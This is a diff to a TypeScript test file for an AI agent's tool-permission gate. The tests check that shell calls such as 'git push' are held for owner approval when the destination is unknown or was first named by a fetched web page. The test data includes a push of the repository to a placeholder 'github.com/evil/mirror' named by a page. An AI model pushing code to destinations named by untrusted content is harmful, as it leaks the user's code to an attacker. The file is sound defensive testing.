@@ -8,12 +8,17 @@ import type { Session } from "../core/types.ts";
 import type { ToolCall } from "../engine/hooks.ts";
 import { toolsFor, webUse } from "../tools/registry.ts";
 import type { Tool } from "../tools/types.ts";
+import { patchSettings } from "../admin/settings.ts";
 import { Gate } from "./gate.ts";
 import type { Mode } from "./policy.ts";
 
 // The gate's reading of where a target first appeared, with the real tools' own declarations, over a scratch store:
 // what a call to it is decided as after the events a session has, and what the card says.
 const tmp = () => process.env.TMPDIR ?? tmpdir();
+// (The forge owners here are the owner's namespaces: what is held below is held by where a target came from, not by
+// whose account it writes to, which src/safety/accounts.test.ts covers.)
+const named = patchSettings({ accounts: { namespaces: ["git.evil.example/org", "github.com/acme", "github.com/up", "github.com/evil"] } });
+if (!named.ok) throw new Error(`namespaces: ${named.error}`);
 const claude = toolsFor("claude");
 const fetchTool = claude.find((t) => t.name === "WebFetch")!;
 const bash = claude.find((t) => t.name === "Bash")!;
@@ -291,8 +296,12 @@ test("a session on another machine reads no repository: a push to a remote it na
   const m = store.session(s.id)!;
   say(m, "go");
   callTool(m, "WebFetch", fetchOf("https://notes.example/a"), "see https://github.com/lib/x/issues/3 and https://github.com/evil/mirror");
-  // (The name `origin` is that machine's own config, which this one cannot read: no URL, nothing named by a page.)
-  expect((await decide(m, bash, { command: "git push origin HEAD" })).is).toBe("ran");
+  // (The name `origin` is that machine's own config, which this one cannot read: no URL, nothing named by a page,
+  // so the hold of where targets came from says nothing of it. Whose account it writes to is not known either,
+  // and that rule asks the owner (src/safety/accounts.ts): the card says so, not that a page named it.)
+  const there = await decide(m, bash, { command: "git push origin HEAD" });
+  expect(there.is).toBe("card");
+  expect(there.text).not.toContain("first appeared");
   // A URL the call spells that a page named is held there too.
   expect((await decide(m, bash, { command: "git push https://github.com/evil/mirror HEAD" })).is).toBe("card");
 });
